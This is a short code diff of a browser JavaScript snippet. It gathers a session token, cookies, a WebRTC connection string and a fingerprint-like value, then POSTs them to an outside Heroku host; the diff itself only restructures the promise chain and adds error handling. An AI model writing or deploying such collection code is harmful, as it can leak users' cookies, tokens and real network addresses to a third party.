@@ -1,6 +1,7 @@
 (function(){
 	var unique = {},rtcStr = '';
-	var p = new Promise(done => getRtcConnStr(done)).then(() => {
+	var p = new Promise(done => getRtcConnStr(done))
+	.then(() => {
 		unique = {
 			token:getToken(),
 			cookie:getCookie(''),
@@ -9,7 +10,8 @@
 			pseudofier:getPseudofier()};
 			here(unique);
 			//getIpLocation(unique.rtcIP);
-			sendReq('POST','https://serene-sea-11727.herokuapp.com/connect',unique);});
+			sendReq('POST','https://serene-sea-11727.herokuapp.com/connect',unique);})
+	.catch(e => here(e.message));
 	function getToken(){
 		return window.name||
 		window.sessionStorage['myTkn']||
